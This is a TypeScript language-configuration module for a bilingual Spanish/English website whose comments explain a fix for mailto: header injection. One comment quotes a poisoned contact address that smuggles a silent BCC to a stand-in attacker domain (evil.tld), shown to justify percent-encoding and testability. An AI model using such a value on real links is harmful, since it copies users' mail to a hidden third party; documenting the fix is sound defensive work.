import { CORREO_CONTACTO } from "../config.js";

import { en } from "./en.js";
import { es } from "./es.js";
import type { Copy, Correo } from "./types.js";

export type { Copy } from "./types.js";

/**
 * Los idiomas que la web sirve hoy, con su ruta.
 *
 * El castellano vive en la raíz porque es el idioma en el que se escribió primero y el de la primera
 * ONG a la que se va a escribir; el inglés cuelga de `/en/` porque es el idioma del mantenedor de open
 * source, que es la audiencia que decide el tono. Ninguna de las dos es «la traducción» de la otra:
 * las dos son la página.
 */
export const IDIOMAS = {
  es: { copy: es, ruta: "/" },
  en: { copy: en, ruta: "/en/" },
} as const satisfies Record<string, { copy: Copy; ruta: string }>;

export type CodigoIdioma = keyof typeof IDIOMAS;

/** El otro idioma, para el conmutador y para los `hreflang` cruzados. */
export const OTRO_IDIOMA: Record<CodigoIdioma, CodigoIdioma> = { es: "en", en: "es" };

/** Todos los códigos, para iterar en los tests y en las etiquetas `alternate`. */
export const CODIGOS: readonly CodigoIdioma[] = Object.keys(IDIOMAS) as CodigoIdioma[];

/**
 * Construye el `mailto:` de una vía a partir de SU bloque de correo.
 *
 * Recibe el `Correo` entero y no sus trozos sueltos: así el asunto y el cuerpo salen siempre del mismo
 * idioma y de la misma vía. Cruzarlos —un asunto en inglés con un cuerpo en castellano— es el fallo
 * silencioso natural de una web bilingüe con dos formularios, y aquí no hay forma de escribirlo sin
 * darse cuenta.
 *
 * `encodeURIComponent` no es cosmética: los cuerpos llevan saltos de línea, tildes y signos de
 * interrogación, y sin codificar el cliente de correo se come el cuerpo a partir del primer `&`.
 *
 * **Y la dirección se codifica igual que el resto.** Iba cruda, y `seguridad` lo reprodujo: con
 * `CORREO_CONTACTO = "hola@relevo.org?bcc=x%40evil.tld&z=q.io"` —que pasa el validador de
 * `config.ts`, porque `%40` no es un `@` literal— salía un BCC silencioso y funcional en las dos
 * llamadas a la acción de la página. Percent-encoded (`hola%40relevo.org`) es válido por RFC 6068 y
 * cierra la inyección de cabeceras de raíz.
 *
 * Importa QUIÉN escribe ese valor: `config.ts` está diseñado para que una persona pegue ahí una
 * dirección, o sea alguien que no está pensando en semántica de URL. La defensa no puede depender de
 * que lo piense.
 *
 * `direccionCruda` es un parámetro con valor por defecto y NO un adorno: con la dirección leída
 * directamente de la constante, el invariante era **imposible de testear**. La constante de hoy no
 * tiene caracteres especiales, así que codificarla o no da el mismo resultado, y la batería de
 * mutantes lo demostró — quitar el `encodeURIComponent` no ponía roja ninguna suite. Un aserto
 * escribiendo la URL a mano tampoco sirve: ejercita la cadena del test, no esta función. Poder
 * inyectar una dirección envenenada es lo que convierte la promesa en gate.
 */
export function construirMailto(correo: Correo, direccionCruda: string = CORREO_CONTACTO): string {
  const direccion = encodeURIComponent(direccionCruda);
  const asunto = encodeURIComponent(correo.asunto);
  const cuerpo = encodeURIComponent(correo.cuerpo.join("\n"));
  return `mailto:${direccion}?subject=${asunto}&body=${cuerpo}`;
}
